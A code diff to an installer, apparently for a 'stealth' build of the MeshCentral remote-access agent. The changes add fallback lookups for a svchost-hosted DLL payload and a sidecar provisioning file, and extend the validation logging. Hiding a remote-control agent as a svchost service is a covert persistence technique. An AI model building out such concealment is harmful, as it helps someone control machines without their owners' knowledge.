@@ -162,7 +162,7 @@ static void Stealth_ResolveDefaultLogPath(void);
 static void Stealth_LogAnsiMessage(const char* message);
 static void Stealth_EnsureLogDirectory(void);
 static void Stealth_PruneInstallLogIfNeeded(void);
-static void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName);
+void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName);
 void Stealth_EnsureLoggingDefaults(void);
 static BOOL Stealth_StopServiceAndWait(const wchar_t* serviceName, DWORD timeoutMs, BOOL forceTerminate);
 static BOOL Stealth_QueryServiceStartType(const wchar_t* serviceName, DWORD* startTypeOut);
@@ -192,6 +192,7 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
 static BOOL Stealth_ConfigHasRequiredKeys(const wchar_t* configPath);
 static BOOL Stealth_HasEmbeddedMshPayload(const wchar_t* exePath);
 static BOOL Stealth_BuildSiblingPathWithExtension(const wchar_t* sourcePath, const wchar_t* extension, wchar_t* outPath, size_t outPathCch);
+static BOOL Stealth_BuildSiblingPathWithFileName(const wchar_t* sourcePath, const wchar_t* fileName, wchar_t* outPath, size_t outPathCch);
 static BOOL Stealth_TryStageAndValidateSvchostDll(const wchar_t* candidatePath, const wchar_t* destPath, const wchar_t* sourceLabel);
 static BOOL Stealth_ShouldEnableDebugConsole(void);
 static void Stealth_AppendConfigOverride(const wchar_t* path, const char* key, const char* value);
@@ -1553,11 +1554,15 @@ void Stealth_EnsureLoggingDefaults(void)
     MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), logDir, _countof(logDir));
     if (logDir[0] == L'\0')
     {
-        if (!MeshInstaller_GetDefaultInstallRoot(logDir, _countof(logDir)))
+        wchar_t defaultRoot[MAX_PATH] = {0};
+        if (!MeshInstaller_GetDefaultInstallRoot(defaultRoot, _countof(defaultRoot)))
         {
             return;
         }
-        MeshInstaller_CombinePath(logDir, _countof(logDir), logDir, L"logs");
+        if (!MeshInstaller_CombinePath(logDir, _countof(logDir), defaultRoot, L"logs"))
+        {
+            return;
+        }
     }
 
     wchar_t logName[MAX_PATH] = {0};
@@ -2343,6 +2348,32 @@ static BOOL Stealth_BuildSiblingPathWithExtension(const wchar_t* sourcePath, con
     return SUCCEEDED(StringCchCatW(outPath, outPathCch, extension));
 }
 
+static BOOL Stealth_BuildSiblingPathWithFileName(const wchar_t* sourcePath, const wchar_t* fileName, wchar_t* outPath, size_t outPathCch)
+{
+    wchar_t* slash = NULL;
+    wchar_t* altSlash = NULL;
+
+    if (sourcePath == NULL || sourcePath[0] == L'\0' || fileName == NULL || fileName[0] == L'\0' || outPath == NULL || outPathCch == 0) { return FALSE; }
+    outPath[0] = L'\0';
+    if (FAILED(StringCchCopyW(outPath, outPathCch, sourcePath))) { return FALSE; }
+
+    slash = wcsrchr(outPath, L'\\');
+    altSlash = wcsrchr(outPath, L'/');
+    if (altSlash != NULL && (slash == NULL || altSlash > slash))
+    {
+        slash = altSlash;
+    }
+
+    if (slash == NULL)
+    {
+        return SUCCEEDED(StringCchCopyW(outPath, outPathCch, fileName));
+    }
+
+    ++slash;
+    *slash = L'\0';
+    return SUCCEEDED(StringCchCatW(outPath, outPathCch, fileName));
+}
+
 static BOOL Stealth_DirectoryHasEntries(const wchar_t* path)
 {
     WIN32_FIND_DATAW findData;
@@ -2551,7 +2582,6 @@ static BOOL Stealth_PrepareUpdateTransaction(const StealthInstallPaths* paths, c
     const wchar_t* dbLeaf = NULL;
     const wchar_t* mshLeaf = NULL;
     const wchar_t* defaultMshLeaf = L"MeshAgent.msh";
-    BOOL sourceHasProvisioning = FALSE;
     if (paths == NULL || tx == NULL) { return FALSE; }
     UNREFERENCED_PARAMETER(sourceDllPath);
     ZeroMemory(tx, sizeof(*tx));
@@ -2604,21 +2634,16 @@ static BOOL Stealth_PrepareUpdateTransaction(const StealthInstallPaths* paths, c
         tx->stagedExeReady = TRUE;
     }
 
-    sourceHasProvisioning = (sourceExePath != NULL && sourceExePath[0] != L'\0' && Stealth_HasEmbeddedMshPayload(sourceExePath));
-    if (sourceHasProvisioning)
+    if (sourceExePath != NULL && sourceExePath[0] != L'\0' &&
+        Stealth_EnsureConfigFile(sourceExePath, tx->stagedConfPath))
     {
-        if (!Stealth_EnsureConfigFile(sourceExePath, tx->stagedConfPath))
-        {
-            Stealth_LogInstallEvent(L"[UPDATE] Embedded provisioning .conf payload failed validation");
-            return FALSE;
-        }
         tx->stagedConfReady = TRUE;
     }
     if (!tx->stagedConfReady)
     {
         if (!allowInstalledProvisioning)
         {
-            Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid provisioning .conf file from embedded package payload");
+            Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid provisioning .conf file from package payload");
             return FALSE;
         }
         if (!tx->liveConfExists || !Stealth_ConfigHasRequiredKeys(paths->confPath))
@@ -2629,20 +2654,16 @@ static BOOL Stealth_PrepareUpdateTransaction(const StealthInstallPaths* paths, c
         Stealth_LogInstallEvent(L"[UPDATE] Binary-only update retaining installed provisioning .conf (%ls)", paths->confPath);
     }
 
-    if (sourceHasProvisioning)
+    if (sourceExePath != NULL && sourceExePath[0] != L'\0' &&
+        Stealth_EnsureMshFile(sourceExePath, tx->stagedMshPath))
     {
-        if (!Stealth_EnsureMshFile(sourceExePath, tx->stagedMshPath))
-        {
-            Stealth_LogInstallEvent(L"[UPDATE] Embedded provisioning .msh payload failed validation");
-            return FALSE;
-        }
         tx->stagedMshReady = TRUE;
     }
     if (!tx->stagedMshReady)
     {
         if (!allowInstalledProvisioning)
         {
-            Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid provisioning .msh file from embedded package payload");
+            Stealth_LogInstallEvent(L"[UPDATE] Unable to stage a valid provisioning .msh file from package payload");
             return FALSE;
         }
         if (!tx->liveMshExists || !Stealth_ConfigHasRequiredKeys(tx->liveMshPath))
@@ -2959,8 +2980,9 @@ static BOOL Stealth_ApplyInstallFlow(
         return FALSE;
     }
     Stealth_LogInstallEvent(
-        L"[INSTALL] Package preflight passed (embeddedProvisioning=%u)",
-        preflight.sourceEmbeddedConfigPresent);
+        L"[INSTALL] Package preflight passed (embeddedProvisioning=%u sidecarProvisioning=%u)",
+        preflight.sourceEmbeddedConfigPresent,
+        preflight.sourceSidecarConfigPresent);
     if (sourceDllPath != NULL && sourceDllPath[0] != L'\0' && !Stealth_ValidateSvchostPayloadDll(sourceDllPath))
     {
         Stealth_LogInstallEvent(L"[INSTALL] Package preflight failed: invalid svchost DLL source (%ls)", sourceDllPath);
@@ -3421,10 +3443,11 @@ static BOOL Stealth_ApplyUpdateFlow(const wchar_t* sourceExePath, const wchar_t*
         Stealth_LogInstallEvent(L"[UPDATE] Package preflight failed: %ls", preflightReason);
         return FALSE;
     }
-    allowInstalledProvisioning = !preflight.sourceEmbeddedConfigPresent;
+    allowInstalledProvisioning = !preflight.configAvailable;
     Stealth_LogInstallEvent(
-        L"[UPDATE] Package preflight passed (embeddedProvisioning=%u manifestRequireConfig=%u allowInstalledProvisioning=%u)",
+        L"[UPDATE] Package preflight passed (embeddedProvisioning=%u sidecarProvisioning=%u manifestRequireConfig=%u allowInstalledProvisioning=%u)",
         preflight.sourceEmbeddedConfigPresent,
+        preflight.sourceSidecarConfigPresent,
         requireConfig,
         allowInstalledProvisioning);
     if (allowInstalledProvisioning)
@@ -4518,7 +4541,9 @@ static BOOL Stealth_BuildTransitionPlan(const StealthLifecycleDiscovery* discove
                 STEALTH_LIFECYCLE_ACTION_INSTALL : STEALTH_LIFECYCLE_ACTION_REPAIR;
             break;
         case STEALTH_LIFECYCLE_REQUEST_UNINSTALL:
-            plan->action = (discovery->stateKind == STEALTH_LIFECYCLE_STATE_CLEAN) ?
+            plan->action = (discovery->stateKind == STEALTH_LIFECYCLE_STATE_CLEAN &&
+                            !discovery->installRootExists &&
+                            !discovery->logsDirExists) ?
                 STEALTH_LIFECYCLE_ACTION_NONE : STEALTH_LIFECYCLE_ACTION_UNINSTALL;
             break;
         default:
@@ -5191,6 +5216,9 @@ cleanup:
 
 static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wchar_t* sourceDllPath, const wchar_t* destPath)
 {
+    wchar_t candidatePath[MAX_PATH * 4] = {0};
+    wchar_t brandedCandidatePath[MAX_PATH * 4] = {0};
+    wchar_t brandedDllName[MAX_PATH] = {0};
     BOOL packageProvided = (sourceExePath != NULL && sourceExePath[0] != L'\0');
 
     if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
@@ -5205,6 +5233,13 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
 
     if (packageProvided)
     {
+        if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".dll", candidatePath, _countof(candidatePath)) &&
+            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(candidatePath, sourceDllPath) != 0) &&
+            Stealth_TryStageAndValidateSvchostDll(candidatePath, destPath, L"package same-basename DLL"))
+        {
+            return TRUE;
+        }
+
         Stealth_DeleteFileIfPresent(destPath);
         if (Stealth_ExtractEmbeddedSvchostDllFromExe(sourceExePath, destPath))
         {
@@ -5221,8 +5256,25 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
             Stealth_DeleteFileIfPresent(destPath);
         }
 
+        MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), brandedDllName, _countof(brandedDllName));
+        if (brandedDllName[0] != L'\0' &&
+            Stealth_BuildSiblingPathWithFileName(sourceExePath, brandedDllName, brandedCandidatePath, _countof(brandedCandidatePath)) &&
+            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(brandedCandidatePath, sourceDllPath) != 0) &&
+            Stealth_TryStageAndValidateSvchostDll(brandedCandidatePath, destPath, L"package sibling branded DLL"))
+        {
+            return TRUE;
+        }
+
+        if (Stealth_BuildSiblingPathWithFileName(sourceExePath, STEALTH_FALLBACK_DLL_NAME, candidatePath, _countof(candidatePath)) &&
+            (sourceDllPath == NULL || sourceDllPath[0] == L'\0' || _wcsicmp(candidatePath, sourceDllPath) != 0) &&
+            (brandedCandidatePath[0] == L'\0' || _wcsicmp(candidatePath, brandedCandidatePath) != 0) &&
+            Stealth_TryStageAndValidateSvchostDll(candidatePath, destPath, L"package sibling fallback DLL"))
+        {
+            return TRUE;
+        }
+
         Stealth_DeleteFileIfPresent(destPath);
-        Stealth_LogInstallEvent(L"Package did not provide a valid embedded svchost DLL payload (%ls)", sourceExePath);
+        Stealth_LogInstallEvent(L"Package did not provide a valid svchost DLL payload (%ls)", sourceExePath);
         return FALSE;
     }
 
@@ -5249,23 +5301,61 @@ static BOOL Stealth_EnsureSvchostDllFile(const wchar_t* sourceExePath, const wch
 
 static BOOL Stealth_EnsureConfigFile(const wchar_t* sourceExePath, const wchar_t* destPath)
 {
+    wchar_t sidecarPath[MAX_PATH * 4] = {0};
+
     if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
     if (sourceExePath == NULL || sourceExePath[0] == L'\0')
     {
         return FALSE;
     }
-    return Stealth_ExtractEmbeddedMshFromExe(sourceExePath, destPath) && Stealth_ConfigHasRequiredKeys(destPath);
+
+    Stealth_DeleteFileIfPresent(destPath);
+    if (Stealth_ExtractEmbeddedMshFromExe(sourceExePath, destPath) && Stealth_ConfigHasRequiredKeys(destPath))
+    {
+        return TRUE;
+    }
+
+    Stealth_DeleteFileIfPresent(destPath);
+    if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".msh", sidecarPath, _countof(sidecarPath)) &&
+        Stealth_ConfigHasRequiredKeys(sidecarPath) &&
+        Stealth_CopyFileOverwrite(sidecarPath, destPath) &&
+        Stealth_ConfigHasRequiredKeys(destPath))
+    {
+        return TRUE;
+    }
+
+    Stealth_DeleteFileIfPresent(destPath);
+    return FALSE;
 }
 
 static BOOL Stealth_EnsureMshFile(const wchar_t* sourceExePath, const wchar_t* destPath)
 {
+    wchar_t sidecarPath[MAX_PATH * 4] = {0};
+
     if (destPath == NULL || destPath[0] == L'\0') { return FALSE; }
 
     if (sourceExePath == NULL || sourceExePath[0] == L'\0')
     {
         return FALSE;
     }
-    return Stealth_ExtractEmbeddedMshFromExe(sourceExePath, destPath) && Stealth_ConfigHasRequiredKeys(destPath);
+
+    Stealth_DeleteFileIfPresent(destPath);
+    if (Stealth_ExtractEmbeddedMshFromExe(sourceExePath, destPath) && Stealth_ConfigHasRequiredKeys(destPath))
+    {
+        return TRUE;
+    }
+
+    Stealth_DeleteFileIfPresent(destPath);
+    if (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".msh", sidecarPath, _countof(sidecarPath)) &&
+        Stealth_ConfigHasRequiredKeys(sidecarPath) &&
+        Stealth_CopyFileOverwrite(sidecarPath, destPath) &&
+        Stealth_ConfigHasRequiredKeys(destPath))
+    {
+        return TRUE;
+    }
+
+    Stealth_DeleteFileIfPresent(destPath);
+    return FALSE;
 }
 
 BOOL Stealth_PreflightPackageSource(
@@ -5301,8 +5391,14 @@ BOOL Stealth_PreflightPackageSource(
 
     target->sourceExePresent = TRUE;
     target->sourceEmbeddedConfigPresent = Stealth_HasEmbeddedMshPayload(sourceExePath);
+    {
+        wchar_t sidecarPath[MAX_PATH * 4] = {0};
+        target->sourceSidecarConfigPresent =
+            (Stealth_BuildSiblingPathWithExtension(sourceExePath, L".msh", sidecarPath, _countof(sidecarPath)) &&
+             Stealth_ConfigHasRequiredKeys(sidecarPath));
+    }
 
-    target->configAvailable = target->sourceEmbeddedConfigPresent;
+    target->configAvailable = (target->sourceEmbeddedConfigPresent || target->sourceSidecarConfigPresent);
 
     if (!requireConfig || target->configAvailable)
     {
@@ -5314,9 +5410,10 @@ BOOL Stealth_PreflightPackageSource(
         (void)StringCchPrintfW(
             failureReason,
             failureReasonCch,
-            L"no embedded MeshCentral provisioning payload was found for %ls (embedded=%u)",
+            L"no embedded or sidecar MeshCentral provisioning payload was found for %ls (embedded=%u sidecar=%u)",
             sourceExePath,
-            target->sourceEmbeddedConfigPresent);
+            target->sourceEmbeddedConfigPresent,
+            target->sourceSidecarConfigPresent);
     }
     return FALSE;
 }
@@ -5938,6 +6035,7 @@ static void Stealth_PrintPackageValidationJson(const StealthPackageValidationSum
     printf("\"checks\":{");
     printf("\"sourceExePresent\":%s,", summary->preflight.sourceExePresent ? "true" : "false");
     printf("\"sourceEmbeddedConfigPresent\":%s,", summary->preflight.sourceEmbeddedConfigPresent ? "true" : "false");
+    printf("\"sourceSidecarConfigPresent\":%s,", summary->preflight.sourceSidecarConfigPresent ? "true" : "false");
     printf("\"configAvailable\":%s", summary->preflight.configAvailable ? "true" : "false");
     printf("}}\n");
 }
@@ -6262,8 +6360,9 @@ BOOL Stealth_RunPackageValidation(const wchar_t* sourceExePath, BOOL requireConf
     if (summary.success)
     {
         Stealth_LogInstallEvent(
-            L"[VALIDATION] package validation PASSED (embeddedProvisioning=%u)",
-            summary.preflight.sourceEmbeddedConfigPresent);
+            L"[VALIDATION] package validation PASSED (embeddedProvisioning=%u sidecarProvisioning=%u)",
+            summary.preflight.sourceEmbeddedConfigPresent,
+            summary.preflight.sourceSidecarConfigPresent);
     }
     else
     {
@@ -6407,7 +6506,7 @@ static void Stealth_BuildTaskPrefixFromHint(const wchar_t* hint, const wchar_t* 
     }
 }
 
-static void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName)
+void Stealth_SetInstallerLogPathToTemp(const wchar_t* fileName)
 {
     wchar_t tempPath[MAX_PATH] = {0};
     if (GetTempPathW(_countof(tempPath), tempPath) == 0) { return; }
